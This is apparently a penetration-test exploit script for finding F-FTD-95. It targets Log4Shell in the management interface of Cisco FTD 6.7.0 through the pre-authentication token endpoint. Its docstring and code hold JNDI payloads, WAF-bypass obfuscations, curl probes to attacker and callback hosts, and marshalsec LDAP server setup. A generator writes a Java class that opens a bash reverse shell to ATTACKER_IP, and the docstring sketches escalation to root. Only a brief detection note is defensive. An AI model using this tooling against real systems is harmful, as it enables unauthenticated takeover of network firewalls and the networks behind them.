"""
F-FTD-95: CVE-2021-44228 Log4Shell — pre-auth RCE via FDM token endpoint grant_type logging
CONTROLLED ENVIRONMENT ONLY

Root cause:
  log4j-core-2.3.jar in FDM Tomcat WEB-INF/lib:
    - JndiLookup.class CONFIRMED PRESENT
    - Vulnerable range: 2.0-beta9 to 2.14.1 (2.3 is within range)

  log4j-slf4j-impl-2.3.jar:
    - SLF4J → log4j2 binding: all SLF4J logger calls route to log4j-core-2.3
    - log4j-1.2-api-2.3.jar: log4j1 API → log4j2 bridge

  log4j2-production.xml:
    - Root logger: level="info"
    - Pattern: %m%n (message content processed for substitutions)
    - ALL INFO+ log statements have their message content processed by StrSubstitutor

  NgfwTokenGrantFilter.class (com.cisco.ngfw.onbox.rest.auth):
    - Uses: org.slf4j.Logger (SLF4J)
    - Logs at INFO: "Value of grant_type from request: {}" with the grant_type value
    - grant_type is taken DIRECTLY from the request body — no sanitization
    - Fires BEFORE any authentication: this is the token endpoint filter, runs pre-auth

  Attack path:
    POST /fdm/token
    Content-Type: application/json
    {"grant_type": "${jndi:ldap://attacker.com/a}", "username": "x", "password": "y"}

    → NgfwTokenGrantFilter.doFilter() reads grant_type from request body
    → logger.info("Value of grant_type from request: {}", "${jndi:ldap://...}")
    → SLF4J routes to log4j2 core 2.3
    → log4j2 StrSubstitutor processes "${jndi:...}" in the logged value
    → JndiLookup.lookup() calls ctx.lookup("ldap://attacker.com/a")
    → LDAP referral → attacker's serialized Java object
    → Deserialization in JVM context → code exec as www (Tomcat process owner)

  Secondary vectors (TokenGrantCustom INFO logging):
    - "Invalid grant_type: {}" — same pattern, different trigger path
    - "The password access-token has expired: {}" — requires expired token
    - "Got exception parsing and validating access-token: " + value (string concat)

VERSIONS:
  FTD 6.7.0-65 (Nov 2020) — log4j 2.3 (May 2015), shipped Nov 2020
  Log4Shell patch: log4j 2.15.0 (Dec 2021) — Cisco never patched FTD 6.7.x (EOL)
  Affected: All FTD 6.7.0 deployments with FDM (on-box management)
  NOT affected: FMC-managed FTD without FDM UI (FDM Tomcat not running)

IMPACT:
  - Pre-auth RCE as www user on FTD — no credentials required
  - FDM port 443 must be reachable (management interface)
  - Shell access: www user → escalate via F-FTD-73 (PERL5LIB) or F-FTD-85 (installpkg)
  - Full root chain: Log4Shell → www shell → F-FTD-85 → root, all pre-auth

CHAIN:
  External attacker → HTTPS port 443 (FDM management)
  → POST /fdm/token with grant_type="${jndi:ldap://attacker.com/a}"
  → NgfwTokenGrantFilter INFO log → log4j2 JNDI → LDAP callback to attacker
  → Attacker LDAP returns: reference to Java class on attacker's HTTP server
  → FDM JVM loads + instantiates attacker's class → exec as www
  → www shell → F-FTD-73 (env_keep PERL5LIB) or F-FTD-85 (sudo installpkg)
  → root code execution on FTD

NETWORK REQUIREMENTS:
  - FTD management interface accessible on port 443 (FDM)
  - Outbound: FTD JVM must reach attacker LDAP on port 389 or 1389
    (FTD iptables managed by www via F-FTD-74, but pre-shell FTD default
     allows outbound from management interface)
  - Fallback: use DNS-based exfil (${jndi:dns://attacker.com/a}) for blind detection

JAVA VERSION CAVEAT:
  FTD 6.7.0 ships JRE. Log4Shell deserialization RCE requires Java < 8u191 (LDAP)
  or Java < 6u211. If FTD ships newer JRE, code exec via LDAP referral is blocked
  by com.sun.jndi.ldap.object.trustURLCodebase=false (default since JDK 8u191).
  HOWEVER: DNS callback (${jndi:dns://...}) STILL works regardless of JVM version.
  And: if trustURLCodebase is true OR FTD JRE < 8u191 → full RCE.

  FTD 6.7.0 JRE version check:
    strings /usr/java/jdk/bin/java | grep -i "build\|version"
    → Need live system to confirm; FTD typically ships OpenJDK 8

DETECTION:
  ngfw-onbox.log contains: "Value of grant_type from request: ${jndi:..."
  Pattern: non-standard grant_type values → immediate alert

VERIFY (controlled environment — FTD 6.7.0 lab with FDM):
  Step 1: Start attacker LDAP+HTTP server (ysoserial + marshalsec)
    java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"
    python3 -m http.server 8888  # serve Exploit.class

  Step 2: Probe for DNS callback first (no Java version dependency):
    curl -sk -X POST https://FTD_IP/fdm/token \
      -H 'Content-Type: application/json' \
      -d '{"grant_type":"${jndi:dns://BURP_COLLAB.com/a}","username":"x","password":"y"}'
    # Monitor BurpSuite Collaborator for DNS query from FTD

  Step 3: If DNS received → attempt full RCE:
    curl -sk -X POST https://FTD_IP/fdm/token \
      -H 'Content-Type: application/json' \
      -d '{"grant_type":"${jndi:ldap://ATTACKER_IP:1389/a}","username":"x","password":"y"}'
    # Monitor marshalsec LDAP server for connection + Java class load

  Step 4: Exploit.class (executes reverse shell as www):
    public class Exploit {
        static { try {
            Runtime.getRuntime().exec("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
        } catch (Exception e) {} }
    }

Affected: FTD 6.7.0-65 with FDM management interface
Severity: CRITICAL — pre-auth RCE; no credentials required; internet-accessible if
          management interface exposed; full chain to root via F-FTD-73/F-FTD-85
Auth required: NONE — token endpoint is pre-auth, log fires before any auth check
CVE: CVE-2021-44228 (Log4Shell)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess
import json
import socket
import threading
import time
import base64


JNDI_DNS_PAYLOAD = "${jndi:dns://%s/%s}"
JNDI_LDAP_PAYLOAD = "${jndi:ldap://%s/%s}"
JNDI_RMI_PAYLOAD = "${jndi:rmi://%s/%s}"

# Obfuscated variants (bypass WAF/IPS log4j detection that only match "${jndi:")
JNDI_BYPASS_1 = "${${lower:j}ndi:ldap://%s/%s}"
JNDI_BYPASS_2 = "${${::-j}${::-n}${::-d}${::-i}:ldap://%s/%s}"
JNDI_BYPASS_3 = "${j${::-n}di:ldap://%s/%s}"


def probe_dns_callback(target_ip, target_port, callback_host, path="a"):
    """
    Probe FDM token endpoint with DNS JNDI payload.
    No Java version dependency — DNS lookup fires regardless.
    CONTROLLED ENVIRONMENT ONLY.
    """
    payload = JNDI_DNS_PAYLOAD % (callback_host, path)
    print(f"[*] F-FTD-95: Log4Shell DNS probe against {target_ip}:{target_port}")
    print(f"    Payload:   {payload}")
    print(f"    Monitor:   {callback_host} for DNS query from FTD JVM")

    body = json.dumps({
        "grant_type": payload,
        "username": "probe",
        "password": "probe"
    })

    cmd = [
        "curl", "-sk",
        "-X", "POST",
        f"https://{target_ip}:{target_port}/fdm/token",
        "-H", "Content-Type: application/json",
        "-d", body,
        "--max-time", "10"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    print(f"    HTTP status: {result.returncode}")
    if result.stdout:
        print(f"    Response:   {result.stdout[:200]}")
    print(f"[*] If DNS query received at {callback_host}: CVE-2021-44228 CONFIRMED")
    print(f"    → FDM Tomcat JVM processes JNDI lookups in log messages")


def probe_ldap_rce(target_ip, target_port, attacker_ldap, path="a", use_bypass=False):
    """
    Probe FDM token endpoint with LDAP JNDI payload for full RCE.
    Requires: Java < 8u191 on FTD (trustURLCodebase=true) OR
              JDK RMI class loading enabled.
    CONTROLLED ENVIRONMENT ONLY.
    """
    if use_bypass:
        payload = JNDI_BYPASS_2 % (attacker_ldap, path)
        print(f"[*] F-FTD-95: Log4Shell LDAP probe (WAF-bypass obfuscation)")
    else:
        payload = JNDI_LDAP_PAYLOAD % (attacker_ldap, path)
        print(f"[*] F-FTD-95: Log4Shell LDAP probe for RCE")

    print(f"    Target:    https://{target_ip}:{target_port}/fdm/token")
    print(f"    LDAP:      {attacker_ldap}")
    print(f"    Payload:   {payload}")
    print(f"    Monitor:   marshalsec LDAP server for incoming connection")

    body = json.dumps({
        "grant_type": payload,
        "username": "probe",
        "password": "probe"
    })

    cmd = [
        "curl", "-sk",
        "-X", "POST",
        f"https://{target_ip}:{target_port}/fdm/token",
        "-H", "Content-Type: application/json",
        "-d", body,
        "--max-time", "15"
    ]

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    if result.stdout:
        print(f"    Response:   {result.stdout[:200]}")
    print(f"[*] Check marshalsec LDAP server log for connection from FTD JVM")


def probe_all_vectors(target_ip, target_port, callback_host, attacker_ldap=None):
    """
    Probe all Log4Shell injection vectors on FDM.
    Tests: grant_type field, plus secondary paths.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-95: Multi-vector Log4Shell probe on {target_ip}:{target_port}")

    vectors = [
        # Primary: grant_type logged at INFO before any auth
        {
            "name": "grant_type (primary — NgfwTokenGrantFilter INFO log)",
            "endpoint": "/fdm/token",
            "body": {"grant_type": JNDI_DNS_PAYLOAD % (callback_host, "v1"), "username": "x", "password": "y"},
        },
        # Secondary: invalid grant_type triggers different log path
        {
            "name": "grant_type invalid path (TokenGrantCustom ERROR log)",
            "endpoint": "/fdm/token",
            "body": {"grant_type": JNDI_DNS_PAYLOAD % (callback_host, "v2"), "username": "x", "password": "y"},
        },
        # User-Agent via any endpoint (if Tomcat AccessLogValve uses log4j2)
        {
            "name": "User-Agent header (Tomcat access log path)",
            "endpoint": "/fdm/token",
            "body": {"grant_type": "password", "username": "x", "password": "y"},
            "headers": {"User-Agent": JNDI_DNS_PAYLOAD % (callback_host, "v3")},
        },
    ]

    for v in vectors:
        print(f"\n[*] Vector: {v['name']}")
        extra_headers = v.get("headers", {})
        header_args = []
        for h, val in extra_headers.items():
            header_args += ["-H", f"{h}: {val}"]

        cmd = [
            "curl", "-sk", "-X", "POST",
            f"https://{target_ip}:{target_port}{v['endpoint']}",
            "-H", "Content-Type: application/json",
            "-d", json.dumps(v["body"]),
            "--max-time", "10"
        ] + header_args

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        print(f"    Response: {result.stdout[:150] if result.stdout else '(empty)'}")
        time.sleep(0.5)

    print(f"\n[*] Monitor {callback_host} for DNS queries from FTD JVM")
    print(f"    v1 = grant_type primary vector (most reliable)")
    print(f"    v2 = grant_type secondary error path")
    print(f"    v3 = User-Agent (Tomcat access log — only if using log4j2 appender)")


def generate_exploit_class(lhost, lport, output_path="/tmp/Exploit.java"):
    """
    Generate Exploit.java that spawns reverse shell as www.
    Compile with: javac Exploit.java
    Serve with: python3 -m http.server 8888
    CONTROLLED ENVIRONMENT ONLY.
    """
    java_src = f"""public class Exploit {{
    static {{
        try {{
            String[] cmd = {{"/bin/bash", "-c", "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}};
            Runtime.getRuntime().exec(cmd);
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
"""
    with open(output_path, "w") as f:
        f.write(java_src)
    print(f"[*] F-FTD-95: Exploit.java written to {output_path}")
    print(f"    Compile: javac {output_path}")
    print(f"    Serve:   python3 -m http.server 8888 (in directory with Exploit.class)")
    print(f"    LDAP:    java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://ATTACKER_IP:8888/#Exploit\"")
    print(f"    Payload: {JNDI_LDAP_PAYLOAD % ('ATTACKER_IP:1389', 'a')}")
    return output_path


def local_dns_listener(bind_port=5553, timeout=30):
    """
    Simple local DNS listener to detect JNDI DNS callbacks.
    Use for lab confirmation — not a production DNS server.
    CONTROLLED ENVIRONMENT ONLY.
    """
    import socket
    print(f"[*] F-FTD-95: Starting DNS listener on UDP port {bind_port}")
    print(f"    Waiting {timeout}s for DNS query from FTD JVM...")
    print(f"    NOTE: FTD's JVM will query its configured DNS server, not directly.")
    print(f"    Use BurpSuite Collaborator or interactsh for external DNS detection.")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.bind(("0.0.0.0", bind_port))
        data, addr = sock.recvfrom(512)
        print(f"[!!!] DNS query received from {addr}: {data.hex()[:80]}")
        print(f"[!!!] CVE-2021-44228 CONFIRMED — FTD JVM executed JNDI lookup")
        return True
    except socket.timeout:
        print(f"[-] No DNS query received within {timeout}s")
        return False
    except PermissionError:
        print(f"[-] Permission denied for port {bind_port} — use interactsh or BurpCollab instead")
        return False
    finally:
        try:
            sock.close()
        except Exception:
            pass


def print_attack_summary():
    print("""
F-FTD-95: CVE-2021-44228 Log4Shell — Pre-Auth RCE on FDM Tomcat
================================================================

log4j version:  2.3 (log4j-core-2.3.jar in WEB-INF/lib)
JndiLookup:     CONFIRMED PRESENT (org/apache/logging/log4j/core/lookup/JndiLookup.class)
SLF4J binding:  log4j-slf4j-impl-2.3.jar (SLF4J → log4j2)
Log level:      Root=INFO (NGFWONBOXLOG appender active)

INJECTION POINT:
  NgfwTokenGrantFilter.doFilter() — runs pre-auth on EVERY /fdm/token request
  Log: logger.info("Value of grant_type from request: {}", grantType)
  grantType = raw value from request body JSON — no sanitization

ATTACK:
  POST /fdm/token HTTP/1.1
  Content-Type: application/json

  {"grant_type":"${jndi:ldap://ATTACKER:1389/a}","username":"x","password":"y"}

BLIND DETECTION (no Java version dependency):
  {"grant_type":"${jndi:dns://COLLAB.burpcollaborator.net/a}","username":"x","password":"y"}
  → FTD JVM resolves COLLAB.burpcollaborator.net → DNS query observed

FULL RCE (Java < 8u191 required):
  1. Deploy marshalsec LDAP server + serve Exploit.class
  2. Send payload → FTD JVM → LDAP → loads Exploit.class → exec as www
  3. www shell → F-FTD-73/F-FTD-85 → root

SECONDARY VECTORS (same log4j2 core):
  - Invalid grant_type: "Invalid grant_type: {}" (INFO log — same path)
  - Expired token in custom_token grant: "The password access-token has expired: {}"
  - org.apache.log4j.Logger in DevAuthenticationProvider also bridges to log4j2

CISCO ADVISORY STATUS:
  FTD 6.7.x is EOL as of Cisco's Log4Shell patching window.
  No patch was issued for FTD 6.7.x (CVE-2021-44228).
  Cisco patched FTD 7.1+ (CSCwa47280).
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-95: CVE-2021-44228 Log4Shell — pre-auth RCE on FDM Tomcat")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_attack_summary()

    elif mode == "dns":
        # DNS callback probe — blind detection
        if len(sys.argv) < 5:
            print(f"Usage: {sys.argv[0]} dns <ftd-ip> <ftd-port> <callback-host>")
            sys.exit(1)
        probe_dns_callback(sys.argv[2], int(sys.argv[3]), sys.argv[4])

    elif mode == "ldap":
        # LDAP RCE probe
        if len(sys.argv) < 5:
            print(f"Usage: {sys.argv[0]} ldap <ftd-ip> <ftd-port> <attacker-ldap-host:port> [bypass]")
            sys.exit(1)
        bypass = len(sys.argv) > 5 and sys.argv[5] == "bypass"
        probe_ldap_rce(sys.argv[2], int(sys.argv[3]), sys.argv[4], use_bypass=bypass)

    elif mode == "all":
        # Probe all vectors
        if len(sys.argv) < 5:
            print(f"Usage: {sys.argv[0]} all <ftd-ip> <ftd-port> <callback-host>")
            sys.exit(1)
        ldap = sys.argv[5] if len(sys.argv) > 5 else None
        probe_all_vectors(sys.argv[2], int(sys.argv[3]), sys.argv[4], ldap)

    elif mode == "exploit":
        # Generate Exploit.java
        if len(sys.argv) < 4:
            print(f"Usage: {sys.argv[0]} exploit <lhost> <lport> [output.java]")
            sys.exit(1)
        out = sys.argv[4] if len(sys.argv) > 4 else "/tmp/Exploit.java"
        generate_exploit_class(sys.argv[2], int(sys.argv[3]), out)

    elif mode == "listen":
        # Local DNS listener for lab testing
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 5553
        local_dns_listener(port)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
